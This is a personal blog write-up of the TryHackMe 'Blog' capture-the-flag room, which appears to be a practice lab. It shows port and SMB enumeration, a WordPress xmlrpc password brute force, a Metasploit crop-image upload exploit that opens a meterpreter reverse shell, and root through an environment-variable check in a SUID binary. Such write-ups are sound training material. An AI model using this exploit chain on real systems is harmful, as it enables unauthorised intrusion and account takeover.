---
title: "Blog"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="blog.png" alt="blog" style="width: 200px;" >}}

## Enumeration

```bash
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=
|   256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8

80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-generator: WordPress 5.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry
|_/wp-admin/

139/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2022-03-26T14:59:50+00:00
|_clock-skew: mean: 3m01s, deviation: 0s, median: 3m00s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-03-26T14:59:51
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BLOG<00>             Flags: <unique><active>
|   BLOG<03>             Flags: <unique><active>
|   BLOG<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 53047/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 17529/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 37381/udp): CLEAN (Timeout)
|   Check 4 (port 13635/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked


```

And because it is wordpress (It could not be more obvious)

I add some wpscan to get the version (mostly)

```bash
...

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.72.96/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.72.96/, Match: 'WordPress 5.0'
...

```

It's sometimes in the meta tags in source code, but hey wpscan fast

On the website there is many refferences to a `blog.thm` domain


```html
<form role="search"  method="get" class="search-form" action="http://blog.thm/">

http://blog.thm/author/kwheel/

```
So obviously we add it to our `hosts` file

This might suggest there is a subdomain to look for but let's check the rest first

We can check the samba share first

```bash
└──╼ $enum4linux 10.10.72.96

...

 ========================================
|    Share Enumeration on 10.10.72.96    |
 ========================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.72.96
//10.10.72.96/print$    Mapping: DENIED, Listing: N/A
//10.10.72.96/BillySMB  Mapping: OK, Listing: OK
//10.10.72.96/IPC$      [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

...

 ======================================================================
|    Users on 10.10.72.96 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3132497411-2525593288-1635041108
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-3132497411-2525593288-1635041108 and logon username '', password ''
S-1-5-21-3132497411-2525593288-1635041108-500 *unknown*\*unknown* (8)
S-1-5-21-3132497411-2525593288-1635041108-501 BLOG\nobody (Local User)
...
S-1-5-21-3132497411-2525593288-1635041108-513 BLOG\None (Domain Group)
...

```
Yeah I could just use smbclient directly lol

```bash
└──╼ $smbclient //10.10.72.96/BillySMB// -U anonymous
Enter WORKGROUP\anonymous's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue May 26 19:17:05 2020
  ..                                  D        0  Tue May 26 18:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 19:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 19:13:45 2020
  check-this.png                      N     3082  Tue May 26 19:13:43 2020

                15413192 blocks of size 1024. 9790340 blocks available

smb: \> get Alice-White-Rabbit.jpg
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (34,7 KiloBytes/sec) (average 34,7 KiloBytes/sec)

smb: \> get check-this.png
getting file \check-this.png of size 3082 as check-this.png (5,2 KiloBytes/sec) (average 23,5 KiloBytes/sec)

smb: \> get tswift.mp4
parallel_read returned NT_STATUS_IO_TIMEOUT

```

Yeah I know the tswift.mp4 video was probably not useful but I wanted to see which taylor swift song it was

Now let's check our loot! First the QR code (I use zbar tools)

```bash
└──╼ $zbarimg check-this.png
QR-Code:https://qrgo.page.link/M6dE
scanned 1 barcode symbols from 1 images in 0,01 seconds

```

Haha another rabbit hole! legendary song btw!!

```bash
└──╼ $steghide --extract -sf  Alice-White-Rabbit.jpg
Entrez la passphrase:
�criture des donn�es extraites dans "rabbit_hole.txt".

```

OMFG! I knew it! XD

I knew it and I just kept digging...

And my friends I wanted to share all this with ya'll

So now you know how frustrating the cyber can be sometimes


ok Back to the real thing (the blog)

There is a comment from billy joel's mother (kwhell) but that's all...so we dig again


```bash
                        [Status: 200, Size: 32028, Words: 1628, Lines: 416]
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
atom                    [Status: 301, Size: 0, Words: 1, Lines: 1]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1]
embed                   [Status: 301, Size: 0, Words: 1, Lines: 1]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1]
n                       [Status: 301, Size: 0, Words: 1, Lines: 1]
N                       [Status: 301, Size: 0, Words: 1, Lines: 1]
no                      [Status: 301, Size: 0, Words: 1, Lines: 1]
note                    [Status: 301, Size: 0, Words: 1, Lines: 1]
page1                   [Status: 301, Size: 0, Words: 1, Lines: 1]
rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1]
robots.txt              [Status: 200, Size: 67, Words: 4, Lines: 4]
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1]
rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10]
w                       [Status: 301, Size: 0, Words: 1, Lines: 1]
W                       [Status: 301, Size: 0, Words: 1, Lines: 1]
welcome                 [Status: 301, Size: 0, Words: 1, Lines: 1]
wp-admin                [Status: 301, Size: 307, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 309, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 310, Words: 20, Lines: 10]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]

```

Once again gentlemen...we found nothing useful!

That is where I had the brilliant idea..to focus!

It's a fricking wordpress blog! how do we usually deal with those?

- plugins (#1 reason for wordpress bad reputation)

- Crack admin password and abuse dashboard's php pages

We have two users so far (kwheel and bjoel)

Lets crack them...seems like it's the mom that got a weak one

```bash
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1
Trying kwheel / adelina Time: 00:03:35 <                                                                                                                                                           > (2865 / 14347257)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1

```

Geez that was faster than earlier! now I login with those and access the dashboard!

Aaaaand i could not do much...we can't edit the pages! how am I supposed to put a shell in there?

Maybe there is an authenticated vulnerability we can exploit...

Seems like the version 5.0 is filled with them...

```bash
└──╼ $searchsploit wordpress 5.0
-----------------------------------------------------------------------
 Exploit         Title                                       |  Path
---------------------------------------------------------------------------------
WordPress 5.0.0 - Image Remote Code Execution                | php/webapps/49512.py

WordPress Core 5.0 - Remote Code Execution                   | php/webapps/46511.js

WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)  | php/remote/46662.rb

...

--------------------------------------------------------------------
```

Found alot but 3 for RCE (one is a metasploit module)


I tried the first two, but didnt work...so it seems like metasploit is the way

```bash
msf6 > search wordpress 5.0

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce               2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1  exploit/unix/webapp/wp_property_upload_exec  2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/webapp/wp_property_upload_exec

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) >

```

I didnt use metasploit in a while and It's kinda cool to set options again

```bash
msf6 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.174.85     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   kwheel           yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.226.203     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


```

Now magic

```bash
msf6 exploit(multi/http/wp_crop_rce) > run

[-] Handler failed to bind to 10.8.226.203:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39282 bytes) to 10.0.2.2
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.2:32972 ) at 2022-03-26 20:04:39 +0100

meterpreter > getuid
Server username: www-data

meterpreter > sysinfo
Computer    : blog
OS          : Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64
Meterpreter : php/linux

```
Ok I get a shell real quick

```bash
meterpreter > shell
Process 1608 created.
Channel 1 created.

cd /home
ls
bjoel
cd bjoel
ls
Billy_Joel_Termination_May20-2020.pdf
user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
exit

```
Nieh! I am denied access to things again!

```bash
meterpreter > download Billy_Joel_Termination_May20-2020.pdf
[*] Downloading: Billy_Joel_Termination_May20-2020.pdf -> /home/THM/Blog/Billy_Joel_Termination_May20-2020.pdf
[*] Downloaded 67.49 KiB of 67.49 KiB (100.0%): Billy_Joel_Termination_May20-2020.pdf -> /home/THM/Blog/Billy_Joel_Termination_May20-2020.pdf
[*] download   : Billy_Joel_Termination_May20-2020.pdf -> /home/THM/Blog/Billy_Joel_Termination_May20-2020.pdf
```

We all found the pdf suspicious! so I downloaded it (meterpreter is just awesome)
meh...not useful (poor billy joel, I dont even know what "tardiness" means XD)
The author of this room just love rabbit holes!
Maybe we have to directly try to escalate ...

## Privilege escalation

sudo -l would not be possible so let's look for SUID

```bash
find / -perm -u=s 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su

...

```
Bingo! `/usr/sbin/checker` is HIGHLY suspicious

Gtfobins said nope...so we are doomed!

ok not really...it's a binary so we have to Reverse engineer this a bit

I will try locally and if tools are not available I will download it and ghidra the stuff out of it

```bash
checker
Not an Admin
```
Lol..that thing just prints that (I know I am not admin...yet)

I tried strings but its not available...funny how they got ltrace and strace instead

```bash
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```
`getenv` is what matters here! it checks the content of the `admin` global variable

So what happens when we modify that variable? I don't know...let's see

```bash
export admin=test
ltrace checker
getenv("admin")                                  = "test"
setuid(0)                                        = -1
system("/bin/bash"
```
Oh we get a shell! logic!

And just like that...we are root!

```bash
checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
Now if the "flag" in bjoel folder is not real? where is the real flag?

```bash
find / -type f -name *user*.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt

cat /media/usb/user.txt
billy_joel_did_nothing_wrong

cat /root/root.txt
we_didnt_start_the_fire_mp4

```
lol silly games!

I didnt read the instructions at start...we were even warned about the holes

and also to add the domain name to our hosts file

This room took me way too long to finish

But I enjoyed every minute of it, and every rabbit hole

(And I got that old song stuck in my head again)
